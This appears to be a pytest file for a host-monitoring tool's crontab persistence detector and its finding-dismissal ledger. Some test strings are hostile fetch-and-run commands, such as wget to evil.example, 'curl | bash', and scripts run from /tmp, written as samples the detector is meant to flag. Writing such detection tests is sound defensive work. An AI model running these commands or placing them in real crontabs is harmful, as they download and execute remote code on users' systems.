"""GW-183/GW-184 (owner 2026-11-05: "why is it showing up in the list?
i can't remove it from the list").

GW-184, the false-positive class: the persistence rule flagged the
owner's own cron hygiene — `flock -n /tmp/btclab.lock ...` — because
the regex matches any /tmp/ token, and a lock file is bookkeeping, not
a dropper. Lock-only lines stop being findings; Downloads, curl/wget,
inline code, and any scratch token that is not a .lock stay suspect.

GW-183, the affordance: every hunter finding can be dismissed from its
dossier, permanently by id (the id is the dedup key, so an unchanged
subject never re-appends; a changed crontab is a new id and alerts),
with a HIDDEN strip and a Show-again way back. The store stays
append-only — dismiss hides, it never deletes evidence."""
import json
import os
import pathlib
import sys

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

gi = pytest.importorskip("gi")
gi.require_version("Gtk", "4.0")
if not (os.environ.get("GREYWATCH_TEST_DISPLAY") == "1"
        or os.environ.get("GREYWATCH_XVFB") == "1"):
    pytest.skip(
        "GUI tests open real windows and run only on an explicit test"
        " display (the private Xvfb conftest starts, or"
        " GREYWATCH_TEST_DISPLAY=1 on purpose), never the owner's desktop.",
        allow_module_level=True)

from gi.repository import Gtk  # noqa: E402

from hunter import main, store, web  # noqa: E402
from ui.hunterview import HunterPanel  # noqa: E402
from tests.test_hunter_page import pump  # noqa: E402

class _FakeCrontab:
    """Stand-in for subprocess.run on the crontab probe: the same
    shape the real call returns."""

    def __init__(self, stdout, returncode):
        self.stdout, self.returncode, self.stderr = stdout, returncode, ""


REAL_CRONTAB = [
    "*/30 * * * * flock -n /tmp/btclab.lock timeout 900 python3 "
    "/home/alice/cortexagent-cloud/bitcoin-lab/collectors/pulls.py",
    "0 * * * * flock -n /tmp/syswatch.lock /home/alice/.local/bin/"
    "sys-watch.sh",
    "7 * * * * flock -n /tmp/invi.lock /home/alice/.local/bin/invi-check",
]


# ------------------------------------------------- the rule (GW-184)

def test_lock_hygiene_lines_are_not_droppers():
    assert web._dropper_line(
        "*/30 * * * * flock -n /tmp/btclab.lock timeout 900 python3 "
        "/home/alice/.local/bin/collect.py") is False
    assert web._dropper_line(
        "0 * * * * flock -n /tmp/syswatch.lock /home/alice/.local/bin/"
        "sys-watch.sh") is False
    # Quoting around the lock path must not change the verdict.
    assert web._dropper_line('flock -n "/tmp/x.lock" run.sh') is False
    # A lock under /dev/shm is the same hygiene.
    assert web._dropper_line("flock -n /dev/shm/w.lock worker") is False


def test_real_droppers_stay_findings():
    assert web._dropper_line(
        "flock -n /tmp/x.lock wget -O /tmp/p.sh http://evil.example") \
        is True
    assert web._dropper_line("python3 /tmp/doevil.sh") is True
    assert web._dropper_line("curl -s http://x | bash") is True
    assert web._dropper_line("xdg-open /home/me/Downloads/setup.bin") \
        is True
    # A near-miss name (.lock2) is not a lock file.
    assert web._dropper_line("run /tmp/x.lock2") is True
    # Ordinary paths never matched in the first place.
    assert web._dropper_line(
        "*/30 * * * * python3 /home/alice/tools/pull.py >> log") is False


def test_the_owners_crontab_raises_nothing(tmp_path, monkeypatch):
    returncode = 0

    def fake_run(cmd, **kw):
        return _FakeCrontab("\n".join(REAL_CRONTAB), returncode)

    monkeypatch.setattr(web.subprocess, "run", fake_run)
    assert web.persistence_findings(tmp_path) == [], (
        "the owner's flock lock hygiene must not read as a dropper")
    assert returncode == 0


# ------------------------------------------------- the ledger (GW-183)

def test_quiet_roundtrip_coexists_and_is_safe(tmp_path):
    store.write_config(tmp_path, {"enabled": True})
    store.keep_extension(tmp_path, "ext-abc", "User Agent Switcher")
    f = {"id": "persistence-scratch-path:deadbeef", "rule":
         "persistence-scratch-path", "title": "Startup automation points "
         "at a scratch or fetch location"}
    store.quiet_finding(tmp_path, f)
    store.quiet_finding(tmp_path, f)                # idempotent
    rows = store.quieted_findings(tmp_path)
    assert len(rows) == 1 and rows[0]["id"].startswith("persistence")
    assert "Startup automation" in rows[0]["label"]
    # Both ledgers and the original keys ride through untouched.
    assert store.kept_extension_ids(tmp_path) == {"ext-abc"}
    assert store.read_config(tmp_path)["enabled"] is True
    assert len(store.quieted_ids(tmp_path)) == 1
    # An id-less finding is refused, never half-written.
    before = store.quieted_ids(tmp_path)
    store.quiet_finding(tmp_path, {"rule": "x", "title": "no id"})
    assert store.quieted_ids(tmp_path) == before
    store.unquiet_finding(tmp_path, rows[0]["id"])
    assert store.quieted_findings(tmp_path) == []


def test_tick_never_reappends_a_quieted_subject(tmp_path, monkeypatch):
    dropper = ["7 * * * * flock -n /tmp/x.lock wget -O /tmp/p.sh "
               "http://evil.example"]
    monkeypatch.setattr(web, "_crontab_lines", lambda: dropper)
    events = tmp_path / "events.jsonl"

    def hunt_once():
        # The persistence lane hunts only when the tail hands it fresh
        # events, so every phase appends one and drives a tick itself.
        with open(events, "a", encoding="utf-8") as fh:
            fh.write('{"ts": "2026-11-05T01:00:00+00:00", "from_tool": '
                     '"auditd", "text": "startup probe"}\n')
        main.tick(tmp_path, str(tmp_path), ai_enabled=False,
                  intel_enabled=False)

    def persistence_rows():
        return [f for f in store.read_findings(tmp_path, limit=100)
                if f["rule"] == "persistence-scratch-path"]

    def ids_on_file():
        return [f["id"] for f in store.read_findings(tmp_path, limit=100)]

    events.write_text(
        '{"ts": "2026-11-05T00:00:00+00:00", "from_tool": "auditd", '
        '"text": "startup probe"}\n')
    hunt_once()
    assert not persistence_rows(), (
        "history is never replayed as new; the warm-up raises nothing")
    hunt_once()
    assert len(persistence_rows()) == 1, "the planted dropper is found"
    fid = persistence_rows()[0]["id"]

    store.quiet_finding(tmp_path, {"id": fid,
                                   "rule": "persistence-scratch-path",
                                   "title": "Dismissed in test"})
    _expire_seen(tmp_path)                    # the 72 h window also passes
    hunt_once()
    assert ids_on_file().count(fid) == 1, (
        "a dismissed subject never re-appends even past its window")

    store.unquiet_finding(tmp_path, fid)
    _expire_seen(tmp_path)
    hunt_once()
    assert ids_on_file().count(fid) == 2, (
        "show-again re-arms the subject against the next cycle")


def _expire_seen(tmp_path):
    """The 72 h suppression window and the quiet ledger must agree: the
    ledger holds AFTER the window expires (that is the whole point), so
    testing the ledger means the window has to actually be expired."""
    import datetime as dt
    st = store.read_state(tmp_path)
    old = (dt.datetime.now(dt.timezone.utc)
           - dt.timedelta(hours=73)).isoformat(timespec="seconds")
    st["seen"] = [[k, old] for k, _v in (st.get("seen") or [])]
    store.write_state(tmp_path, st)


# ------------------------------------------------- the desk (GW-183)

def _seed_persistence(data_dir, fid="persistence-scratch-path:abcd1234"):
    store.append_finding(data_dir, {
        "id": fid, "ts": "2026-11-05T02:00:00+00:00",
        "rule": "persistence-scratch-path",
        "title": "Startup automation points at a scratch or fetch location",
        "what": "The user crontab has 3 entries that run from a scratch "
                "folder.",
        "next": "Check the entry.", "severity": "HIGH",
        "confidence": "medium", "status": "lead",
        "facts": ["path=user crontab #3 lines #abc"],
        "evidence": [{"source": "fs", "path": "user crontab"}],
        "hunter": "1"})


def _buttons(widget):
    if hasattr(widget, "observe_children"):
        for child in widget.observe_children():
            if isinstance(child, Gtk.Button):
                yield child
            yield from _buttons(child)


def _click(label, widget):
    for btn in _buttons(widget):
        if btn.get_label() == label:
            btn.emit("clicked")
            pump(10)
            return True
    return False


def test_dismiss_hides_and_show_again_restores(tmp_path):
    _seed_persistence(tmp_path)
    fid = "persistence-scratch-path:abcd1234"
    panel = HunterPanel(tmp_path)
    pump(20)
    assert [f["id"] for f in panel._findings] == [fid]
    assert not panel._quiet_box.get_visible(), "nothing hidden yet"
    panel._select_finding(fid)
    pump(10)
    assert _click("Dismiss this finding", panel._detail)
    pump(20)
    assert panel._findings == [], "dismissed records leave the feed"
    assert panel._quiet_box.get_visible()
    assert store.quieted_ids(tmp_path) == {fid}
    head = [w for w in panel._quiet_box.observe_children()
            if hasattr(w, "get_text") and "HIDDEN" in w.get_text()]
    assert head, "the hidden strip names itself"
    assert _click("Show again", panel._quiet_box)
    pump(20)
    assert [f["id"] for f in panel._findings] == [fid]
    assert store.quieted_ids(tmp_path) == set()


# ------------------------------------------------- the refire law (th-A)

def test_tick_quiets_a_republished_warning_by_rule_and_subject(
        tmp_path, monkeypatch):
    """Rebuild round 2, task 8: the ledger's suppression is keyed
    (rule, subject). A warning dismissed once never re-asks, even when
    it is re-published past its suppression window under a different id
    than the finding the owner saw and dismissed."""
    events = tmp_path / "events.jsonl"
    line = json.dumps({"ts": "2026-11-05T01:00:00+00:00",
                       "from_tool": "rkhunter",
                       "text": "Warning: a probe was found in history"})

    def hunt_once():
        # The event lanes hunt only when the tail hands them fresh
        # events, so every phase appends one and drives a tick itself.
        with open(events, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
        main.tick(tmp_path, str(tmp_path), ai_enabled=False,
                  intel_enabled=False)

    def rootkit_rows():
        return [f for f in store.read_findings(tmp_path, limit=100)
                if f["rule"] == "rootkit-warning"]

    events.write_text(
        '{"ts": "2026-11-05T00:00:00+00:00", "from_tool": "auditd", '
        '"text": "warm-up"}\n')
    hunt_once()
    assert not rootkit_rows(), "history is never replayed as new"
    hunt_once()
    assert len(rootkit_rows()) == 1, "the warning fires once"
    # Dismissed under a legacy id presentation, but the key written is
    # the (rule, subject) pair - the modern republished id is hex that
    # no legacy entry ever carried. The subject is the warning VALUE the
    # finding's one fact carries (the same value the card's Ignore
    # forever and the tick's quiet check both read), label stripped.
    f = rootkit_rows()[0]
    store.quiet_finding(tmp_path, {
        "id": "legacy-id-presentation", "rule": "rootkit-warning",
        "title": "The rootkit checker raised a warning"},
        subject=str((f.get("facts") or [""])[0]).partition("=")[2])
    assert store.quieted_keys(tmp_path), "the dismissal wrote its key"
    _expire_seen(tmp_path)            # the 72 h window also passes
    hunt_once()
    assert len(rootkit_rows()) == 1, (
        "a (rule, subject) dismissal holds even past the window and "
        "under a new id")
